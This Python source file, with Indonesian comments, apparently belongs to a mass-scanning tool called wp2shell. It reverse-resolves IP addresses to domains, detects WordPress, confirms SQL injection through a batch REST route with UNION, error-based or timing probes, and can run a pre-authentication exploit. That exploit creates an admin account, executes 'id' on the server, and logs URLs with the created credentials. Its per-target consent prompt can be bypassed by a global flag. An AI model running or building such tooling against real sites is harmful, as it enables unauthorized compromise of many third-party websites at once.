# wp2shell_scanner.py - WordPress wp2shell scanner for continuous scan mode
import os
import re
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

# Import dari wp2shell
from wp2shell.client import BatchClient, TargetError
from wp2shell.sqli import BlindSQLi, UnionSQLi, ErrorBasedSQLi
from wp2shell.version import public_version_hints, wordpress_markers
from wp2shell.exploit import PreAuthAdminCreator

# Konfigurasi output
OUTPUT_DIR = "wp2shell_results"
VULN_FILE = os.path.join(OUTPUT_DIR, "wp2shell_vuln.txt")
RCE_FILE = os.path.join(OUTPUT_DIR, "wp2shell_rce.txt")
_write_lock = threading.RLock()


def ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)


def append_result(path, line):
    ensure_dirs()
    with _write_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(line.rstrip() + '\n')


def ensure_scheme(url):
    url = (url or '').strip()
    if not url:
        return ''
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url.rstrip('/')


def confirm_authorization(url, action):
    """Konfirmasi izin untuk menjalankan RCE"""
    print(f"\n[!] AUTHORIZATION REQUIRED")
    print(f"    Akan melakukan: {action}")
    print(f"    Target: {url}")
    print(f"    Ini akan mengeksekusi kode dan mengubah state di target.")
    print(f"    Hanya lanjutkan jika Anda memiliki izin untuk menguji target ini.")
    try:
        ans = input("    Lanjutkan? [y/N] ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return False
    return ans in ("y", "yes")


class Wp2shellScanner:
    """Scanner untuk WordPress wp2shell pada domain hasil reverse IP"""

    def __init__(self, cache_manager, main_reference=None, timeout=40.0, sleep=5.0, rounds=3, do_rce=False):
        self.cache_manager = cache_manager
        self.main = main_reference  # untuk update status bar
        self.timeout = timeout
        self.sleep = sleep
        self.rounds = rounds
        self.do_rce = do_rce
        self.found_urls = set()
        self.lock = threading.Lock()
        self.total_domains = 0
        self.total_vuln = 0
        self.total_rce = 0

    def process_domain(self, domain):
        """Proses satu domain: cek wp2shell vulnerability"""
        url = ensure_scheme(domain)
        if not url:
            return None

        # Cek cache
        cache_key = f"wp2shell_{url}"
        cached = self.cache_manager.get_reverse_cache(cache_key)
        if cached:
            return cached

        try:
            client = BatchClient(url, timeout=self.timeout)
        except Exception as e:
            return None

        # Deteksi WordPress
        try:
            markers = wordpress_markers(client)
            hints = public_version_hints(client)
        except Exception:
            markers = []
            hints = []

        if not markers and not hints:
            # Bukan WordPress
            self.cache_manager.save_reverse_cache(cache_key, {'vuln': False, 'reason': 'not_wordpress'}, 'wp2shell')
            return None

        # Probe batch route
        try:
            probe = client.marker_probe()
        except TargetError:
            self.cache_manager.save_reverse_cache(cache_key, {'vuln': False, 'reason': 'unreachable'}, 'wp2shell')
            return None

        if probe.status != 207:
            self.cache_manager.save_reverse_cache(cache_key, {'vuln': False, 'reason': f'batch_http_{probe.status}'}, 'wp2shell')
            return None

        route_confusion = client.has_route_confusion_markers(probe)
        if not route_confusion:
            self.cache_manager.save_reverse_cache(cache_key, {'vuln': False, 'reason': 'no_route_confusion'}, 'wp2shell')
            return None

        # Konfirmasi SQLi
        confirmed = False
        method = None

        # Coba UNION
        try:
            union = UnionSQLi(client)
            if union.available():
                confirmed = True
                method = "UNION"
        except Exception:
            pass

        if not confirmed:
            # Coba error-based
            try:
                error = ErrorBasedSQLi(client)
                if error.available():
                    confirmed = True
                    method = "error_based"
            except Exception:
                pass

        if not confirmed:
            # Timing
            try:
                blind = BlindSQLi(client, sleep=self.sleep)
                result = blind.confirm_timing(samples=self.rounds)
                confirmed = result.confirmed
                method = f"timing (delta={result.delta:.2f}s)"
            except Exception as e:
                confirmed = False
                method = f"timing_failed: {e}"

        if not confirmed:
            self.cache_manager.save_reverse_cache(cache_key, {'vuln': False, 'reason': f'sqli_not_confirmed ({method})'}, 'wp2shell')
            return None

        # Vulnerable!
        result = {
            'vuln': True,
            'url': url,
            'method': method,
            'rce': False,
            'user': None,
            'password': None
        }

        # Simpan ke file
        vuln_line = f"{url} [wp2shell] SQLi confirmed via {method}"
        append_result(VULN_FILE, vuln_line)

        # RCE jika diminta
        if self.do_rce:
            try:
                # Konfirmasi izin
                if self.main and hasattr(self.main, 'rce_authorized') and self.main.rce_authorized:
                    authorized = True
                else:
                    authorized = confirm_authorization(url, "attempt pre-auth RCE via SQLi")

                if authorized:
                    print(f"[*] Attempting RCE on {url}...")
                    engine = PreAuthAdminCreator(
                        url,
                        timeout=max(self.timeout, 180.0),
                        sleep=self.sleep
                    )
                    user, pw, run, cleanup = engine.deploy()
                    output = run("id")
                    cleanup()
                    if output and ('uid=' in output or 'gid=' in output):
                        result['rce'] = True
                        result['user'] = user
                        result['password'] = pw
                        rce_line = f"{url} [RCE] user={user} pass={pw} out={output[:120]}"
                        append_result(RCE_FILE, rce_line)
                        append_result(VULN_FILE, f"{url} [wp2shell-rce] {rce_line}")
                        if self.main:
                            self.main.increment_wp2shell_rce()
                        print(f"[+] RCE SUCCESS on {url}")
            except Exception as e:
                print(f"[-] RCE failed on {url}: {e}")

        # Cache hasil
        self.cache_manager.save_reverse_cache(cache_key, result, 'wp2shell')

        # Update counter di main
        if self.main:
            self.main.increment_wp2shell()

        return result

    def process_ip(self, ip):
        """Proses satu IP: reverse IP -> dapat domain -> scan wp2shell"""
        # Cek apakah IP sudah diproses
        if self.cache_manager.is_ip_processed(ip):
            print(f"[↺] Skipping cached IP: {ip}")
            return

        print(f"\n[*] Processing IP: {ip} for wp2shell")

        # Dapatkan scanner dari main
        if self.main and hasattr(self.main, 'scanner'):
            scanner = self.main.scanner
        else:
            print("[!] Scanner not available for reverse IP")
            return

        # PATCH 10-28: tntcode DICABUT (Cloudflare) — pakai hackertarget saja.
        domains_ht = scanner.reverse_ip_hackertarget(ip)
        all_domains = set(domains_ht)

        if not all_domains:
            print(f"[-] No domains for IP {ip}")
            self.cache_manager.mark_ip_processed(ip, 'no_domains')
            return

        print(f"[+] Total domains: {len(all_domains)} (HT: {len(domains_ht)})")

        # Scan setiap domain untuk wp2shell
        found_count = 0
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.process_domain, domain) for domain in all_domains]
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=120)
                    if result and result.get('vuln'):
                        found_count += 1
                        if result.get('rce'):
                            self.total_rce += 1
                except Exception as e:
                    print(f"[-] Error processing domain: {e}")

        print(f"[+] IP {ip}: {found_count} wp2shell vulnerable domains found")
        self.cache_manager.mark_ip_processed(ip, 'success' if found_count else 'empty')